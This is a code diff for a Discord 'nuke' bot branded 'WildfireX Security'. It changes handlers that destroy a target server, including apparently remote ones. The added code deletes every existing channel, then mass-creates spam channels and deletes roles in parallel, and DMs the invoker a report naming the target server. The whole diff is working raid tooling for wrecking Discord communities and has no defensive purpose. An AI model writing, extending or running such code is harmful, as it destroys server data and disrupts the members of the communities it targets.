@@ -202,16 +202,34 @@ client.on(Events.MessageCreate, async (message) => {
 
   try {
     const log = await nukeServer(targetGuild, client.user.id);
-    await safeSend(reportChannel, invoker, {
-      embeds: [
-        new EmbedBuilder()
-          .setColor(0x2b2d31)
-          .setTitle('💀 Nuke Complete')
-          .setDescription(log.join('\n'))
-          .setFooter({ text: `${targetGuild.name} (${targetGuild.id})` })
-          .setTimestamp(),
-      ],
-    });
+
+    const resultEmbed = new EmbedBuilder()
+      .setColor(0x2b2d31)
+      .setTitle('💀 Nuke Complete')
+      .setDescription(log.join('\n'))
+      .setFooter({ text: `${targetGuild.name} (${targetGuild.id})` })
+      .setTimestamp();
+
+    // Send in channel (may be gone) + always DM the invoker
+    await safeSend(reportChannel, invoker, { embeds: [resultEmbed] });
+    try {
+      const dm = await invoker.createDM();
+      await dm.send({
+        embeds: [
+          new EmbedBuilder()
+            .setColor(0xff0000)
+            .setTitle('📋 Nuke Report — DM Copy')
+            .setDescription(log.join('\n'))
+            .addFields(
+              { name: 'Target Server', value: `${targetGuild.name} (\`${targetGuild.id}\`)`, inline: false },
+              { name: 'Type',          value: isRemote ? '🌐 Remote' : '🏠 Local',            inline: true  },
+              { name: 'Executed By',   value: `<@${invoker.id}>`,                              inline: true  },
+            )
+            .setFooter({ text: 'WildfireX Security' })
+            .setTimestamp(),
+        ],
+      });
+    } catch { /* DM closed */ }
   } catch (err) {
     console.error('[znuke] Unexpected error:', err.message);
     await safeSend(reportChannel, invoker, `❌ Nuke error: \`${err.message}\``);
@@ -365,7 +383,16 @@ client.on(Events.InteractionCreate, async (interaction) => {
 
     try {
       // ── MODE 1: Chan & Role ──────────────────────────────────────────────
+      // Step A: delete all existing channels first
+      // Step B: create spam channels + delete roles in parallel
       if (mode === '1') {
+        // A — wipe existing channels
+        const existingChs = targetGuild.channels.cache.map((ch) => ch.delete().catch(() => {}));
+        const delResults  = await Promise.allSettled(existingChs);
+        const delOk = delResults.filter((r) => r.status === 'fulfilled').length;
+        log.push(`🗑️ **Old Channels Wiped** — \`${delOk}\` deleted`);
+
+        // B — create spam channels + delete roles (parallel)
         const [chanResult, roleResult] = await Promise.allSettled([
           (async () => {
             const tasks = Array.from({ length: count }, async () => {
@@ -378,7 +405,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
             });
             const results = await Promise.allSettled(tasks);
             const ok = results.filter((r) => r.status === 'fulfilled').length;
-            return `📣 **Channels Created** — \`${ok}\` created`;
+            return `📣 **Channels Created** — \`${ok}\` created (\`${channelName}\`)`;
           })(),
           (async () => {
             const botMember  = await targetGuild.members.fetch(client.user.id);
@@ -432,6 +459,27 @@ client.on(Events.InteractionCreate, async (interaction) => {
       ],
       ephemeral: true,
     }).catch(() => {});
+
+    // ── DM the invoker with full report ───────────────────────────────────
+    try {
+      const dm = await interaction.user.createDM();
+      await dm.send({
+        embeds: [
+          new EmbedBuilder()
+            .setColor(0xff0000)
+            .setTitle('📋 Nuke Report — DM Copy')
+            .setDescription(log.join('\n') || 'No actions were performed.')
+            .addFields(
+              { name: 'Target Server', value: `${targetGuild.name} (\`${targetGuild.id}\`)`,      inline: false },
+              { name: 'Mode',          value: `${mode} — ${modeLabel}`,                             inline: true  },
+              { name: 'Type',          value: isRemote ? '🌐 Remote' : '🏠 Local',                 inline: true  },
+              { name: 'Executed By',   value: `<@${interaction.user.id}> (${interaction.user.tag})`, inline: false },
+            )
+            .setFooter({ text: 'WildfireX Security' })
+            .setTimestamp(),
+        ],
+      });
+    } catch { /* DMs closed or blocked */ }
   }
 });
 
